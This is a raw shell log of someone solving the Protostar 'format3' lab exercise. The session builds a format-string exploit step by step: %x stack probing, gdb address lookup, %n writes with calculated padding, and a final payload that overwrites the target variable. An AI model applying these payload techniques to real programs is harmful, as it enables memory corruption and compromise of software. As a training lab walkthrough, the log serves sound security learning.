buffer size 512

 if(target == 0x01025544) {
      printf("you have modified the target :)\n");
  } else {
      printf("target is %08x :(\n", target);
  }


if stack over flow than 'A'*512'+'\x44\x55\x02\x01'

\xf4\x96\x04\x08
\xf5\x96\x04\x08
\xf6\x96\x04\x08
\xf7\x96\x04\x08

 python -c "print 'A'*512+'\x44\x55\x02\x01'" | ./format3
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAtarget is 00000000 :(
user@protostar:/opt/protostar/bin$ python -c "print 'A'*100+'\x44\x55\x02\x01'" | ./format3
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADU
target is 00000000 :(
user@protostar:/opt/protostar/bin$ python -c "print 'A'*10+'\x44\x55\x02\x01'" | ./format3
AAAAAAAAAADU
target is 00000000 :(
user@protostar:/opt/protostar/bin$ python -c "print 'A'*1000+'\x44\x55\x02\x01'" | ./format3
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAtarget is 00000000 :(
user@protostar:/opt/protostar/bin$ python -c "print 'A'*1000000+'\x44\x55\x02\x01'" | ./format3
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAtarget is 00000000 :(
Traceback (most recent call last):
  File "<string>", line 1, in <module>
IOError: [Errno 32] Broken pipe
user@protostar:/opt/protostar/bin$ python -c "print 'A'*100+'\x44\x55\x02\x01'" | ./format3
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADU
target is 00000000 :(
user@protostar:/opt/protostar/bin$ not than we can change value of target 0  to 0x01025544 in gdb
bash: not: command not found
user@protostar:/opt/protostar/bin$ 
user@protostar:/opt/protostar/bin$ python -c "print 'AAAA'+'%x '*3+'%n'" | ./format3
Segmentation fault
user@protostar:/opt/protostar/bin$ segmentation fault because AAAA is not in hex
bash: segmentation: command not found
user@protostar:/opt/protostar/bin$ 
user@protostar:/opt/protostar/bin$ python -c "print 'AAAA'+'%x '*3+'%x'" | ./format3
AAAA0 bffff5d0 b7fd7ff4 0
target is 00000000 :(
user@protostar:/opt/protostar/bin$ python -c "print 'AAAA'+'%x '*4+'%x'" | ./format3
AAAA0 bffff5d0 b7fd7ff4 0 0
target is 00000000 :(
user@protostar:/opt/protostar/bin$ python -c "print 'AAAA'+'%x '*10+'%x'" | ./format3
AAAA0 bffff5d0 b7fd7ff4 0 0 bffff7d8 804849d bffff5d0 200 b7fd8420 bffff614
target is 00000000 :(
user@protostar:/opt/protostar/bin$ python -c "print 'AAAA'+'%x '*115+'%x'" | ./format3
AAAA0 bffff5d0 b7fd7ff4 0 0 bffff7d8 804849d bffff5d0 200 b7fd8420 bffff614 41414141 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 a782520 0 892 b7fe1b28 b7fe1848 8048285 b7ea3f14 80481f4 1 b7ffeff4 bffff840 b7fffab0 bffff814 b7fec242 bffff804 80481f4 bffff7f8 b7fffa54
target is 00000000 :(
user@protostar:/opt/protostar/bin$ python -c "print 'AAAA'+'%x '*15+'%x'" | ./format3
AAAA0 bffff5d0 b7fd7ff4 0 0 bffff7d8 804849d bffff5d0 200 b7fd8420 bffff614 41414141 25207825 78252078 20782520 25207825
target is 00000000 :(
user@protostar:/opt/protostar/bin$ python -c "print 'AAAA'+'%x '*11+'%x'" | ./format3
AAAA0 bffff5d0 b7fd7ff4 0 0 bffff7d8 804849d bffff5d0 200 b7fd8420 bffff614 41414141
target is 00000000 :(
user@protostar:/opt/protostar/bin$ gdb ./format3
GNU gdb (GDB) 7.0.1-debian
Copyright (C) 2009 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "i486-linux-gnu".
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>...
Reading symbols from /opt/protostar/bin/format3...done.
(gdb) print &target
$1 = (int *) 0x80496f4
(gdb) 
$2 = (int *) 0x80496f4
(gdb) ^Z
[2]+  Stopped                 gdb ./format3
user@protostar:/opt/protostar/bin$ python -c "print '\xf4\x96\x04\x08'+'%x '*11+'%n'" | ./format3
�0 bffff5d0 b7fd7ff4 0 0 bffff7d8 804849d bffff5d0 200 b7fd8420 bffff614 
target is 0000004c :(
user@protostar:/opt/protostar/bin$ we got 4c
bash: we: command not found
user@protostar:/opt/protostar/bin$ we can use %u for it
bash: we: command not found
user@protostar:/opt/protostar/bin$ python -c "print '\xf4\x96\x04\x08'+'%x '*11+'%n%n%n%n'" | ./format3
Segmentation fault
user@protostar:/opt/protostar/bin$ it is because no data given
bash: it: command not found
user@protostar:/opt/protostar/bin$ python -c "print '\xf4\x96\x04\x08\xf5\x96\x04\x08\xf6\x96\x04\x08\xf7\x96\x04\x08'+'%x '*11+'%n%n%n%n'" | ./format3
����0 bffff5d0 b7fd7ff4 0 0 bffff7d8 804849d bffff5d0 200 b7fd8420 bffff614 
target is 58585858 :(
user@protostar:/opt/protostar/bin$ change 58585858 to 0x01025544
bash: change: command not found
user@protostar:/opt/protostar/bin$  Before we can place a %nu before each %n, we need to pad our input string since each %nu also pops the stack. We do this by adding \x01\x01\x01\x01 before each address in our input string.
bash: Before: command not found
user@protostar:/opt/protostar/bin$ 
user@protostar:/opt/protostar/bin$ python -c "print '\xf4\x96\x04\x08\x01\x01\x01\x01\xf5\x96\x04\x08\x01\x01\x01\x01\xf6\x96\x04\x08\x01\x01\x01\x01\xf7\x96\x04\x08'+'%x '*11+'%u%n%u%n%u%n%u%n'" | ./format3
Segmentation fault
user@protostar:/opt/protostar/bin$ python -c "print '\xf4\x96\x04\x08\x01\x01\x01\x01\xf5\x96\x04\x08\x01\x01\x01\x01\xf6\x96\x04\x08\x01\x01\x01\x01\xf7\x96\x04\x08'+'%x '*11+'%u'+'%n'+'%u'+'%n'+'%u'+'%n'+'%u'+'%n'" | ./format3
Segmentation fault
user@protostar:/opt/protostar/bin$ python -c "print '\x01\x01\x01\x01\xf4\x96\x04\x08\x01\x01\x01\x01\xf5\x96\x04\x08\x01\x01\x01\x01\xf6\x96\x04\x08\x01\x01\x01\x01\xf7\x96\x04\x08' + '%x.'*11 + '%u%n%u%n%u%n%u%n'" | ./format3
����0.bffff5d0.b7fd7ff4.0.0.bffff7d8.804849d.bffff5d0.200.b7fd8420.bffff614.16843009168430091684300916843009
target is 88807870 :(
user@protostar:/opt/protostar/bin$ python -c "print '\x01\x01\x01\x01\xf4\x96\x04\x08\x01\x01\x01\x01\xf5\x96\x04\x08\x01\x01\x01\x01\xf6\x96\x04\x08\x01\x01\x01\x01\xf7\x96\x04\x08' + '%x '*11 + '%u%n%u%n%u%n%u%n'" | ./format3
����0 bffff5d0 b7fd7ff4 0 0 bffff7d8 804849d bffff5d0 200 b7fd8420 bffff614 16843009168430091684300916843009
target is 88807870 :(
user@protostar:/opt/protostar/bin$ we need to set \x44\x55\x02\x01'
> 
> ^C
user@protostar:/opt/protostar/bin$ we need to set \x44\x55\x02\x01
bash: we: command not found
user@protostar:/opt/protostar/bin$ python
Python 2.6.6 (r266:84292, Dec 27 2010, 00:02:40) 
[GCC 4.4.5] on linux2
Type "help", "copyright", "credits" or "license" for more information.
>>> import sys
>>> import sys
>>> c
KeyboardInterrupt
>>> 
[3]+  Stopped                 python
user@protostar:/opt/protostar/bin$ calculate padding 
bash: calculate: command not found
user@protostar:/opt/protostar/bin$ python
Python 2.6.6 (r266:84292, Dec 27 2010, 00:02:40) 
[GCC 4.4.5] on linux2
Type "help", "copyright", "credits" or "license" for more information.
>>> def calculate(to_write, written):
...     to_write += 0x100
...     written %= 0x100
...     padding = (to_write - written) % 0x100
...     if padding < 10:
...             padding += 0x100
...     return padding
... 
>>> pad = calculate(0x44,0x68)
>>> pad
220
>>> 0x68 is for bcz 58 + \x01 * 16 = 0x64
  File "<stdin>", line 1
    0x68 is for bcz 58 + \x01 * 16 = 0x64
              ^
SyntaxError: invalid syntax
>>> 
KeyboardInterrupt
>>> 
[4]+  Stopped                 python
user@protostar:/opt/protostar/bin$ python -c "print '\x01\x01\x01\x01\xf4\x96\x04\x08\x01\x01\x01\x01\xf5\x96\x04\x08\x01\x01\x01\x01\xf6\x96\x04\x08\x01\x01\x01\x01\xf7\x96\x04\x08' + '%x '*11 + '%220u%n%u%n%u%n%u%n'" | ./format3
����0 bffff5d0 b7fd7ff4 0 0 bffff7d8 804849d bffff5d0 200 b7fd8420 bffff614                                                                                                                                                                                                                     16843009168430091684300916843009
target is 5c544c44 :(
user@protostar:/opt/protostar/bin$ python
Python 2.6.6 (r266:84292, Dec 27 2010, 00:02:40) 
[GCC 4.4.5] on linux2
Type "help", "copyright", "credits" or "license" for more information.
>>> 
[5]+  Stopped                 python
user@protostar:/opt/protostar/bin$ python -c "print '\x01\x01\x01\x01\xf4\x96\x04\x08\x01\x01\x01\x01\xf5\x96\x04\x08\x01\x01\x01\x01\xf6\x96\x04\x08\x01\x01\x01\x01\xf7\x96\x04\x08' + '%x '*11 + '%u%n%u%n%u%n%u%n'" | ./format3
����0 bffff5d0 b7fd7ff4 0 0 bffff7d8 804849d bffff5d0 200 b7fd8420 bffff614 16843009168430091684300916843009
target is 88807870 :(
user@protostar:/opt/protostar/bin$ get 17 173 255
bash: get: command not found
user@protostar:/opt/protostar/bin$ python -c "print '\x01\x01\x01\x01\xf4\x96\x04\x08\x01\x01\x01\x01\xf5\x96\x04\x08\x01\x01\x01\x01\xf6\x96\x04\x08\x01\x01\x01\x01\xf7\x96\x04\x08' + '%x '*11 + '%220u%n%u%n%u%n%u%n'" | ./format3
����0 bffff5d0 b7fd7ff4 0 0 bffff7d8 804849d bffff5d0 200 b7fd8420 bffff614                                                                                                                                                                                                                     16843009168430091684300916843009
target is 5c544c44 :(
user@protostar:/opt/protostar/bin$ 173 = 55
bash: 173: command not found
user@protostar:/opt/protostar/bin$ 17 = 44
bash: 17: command not found
user@protostar:/opt/protostar/bin$ 01 = 02
bash: 01: command not found
user@protostar:/opt/protostar/bin$ python -c "print '\x01\x01\x01\x01\xf4\x96\x04\x08\x01\x01\x01\x01\xf5\x96\x04\x08\x01\x01\x01\x01\xf6\x96\x04\x08\x01\x01\x01\x01\xf7\x96\x04\x08' + '%x '*11 + '%220u%n%17u%n%173u%n%255u%n'" | ./format3
����0 bffff5d0 b7fd7ff4 0 0 bffff7d8 804849d bffff5d0 200 b7fd8420 bffff614                                                                                                                                                                                                                     16843009         16843009                                                                                                                                                                     16843009                                                                                                                                                                                                                                                       16843009
you have modified the target :)
user@protostar:/opt/protostar/bin$ got it yeh
bash: got: command not found
user@protostar:/opt/protostar/bin$ 
user@protostar:/opt/protostar/bin$ 



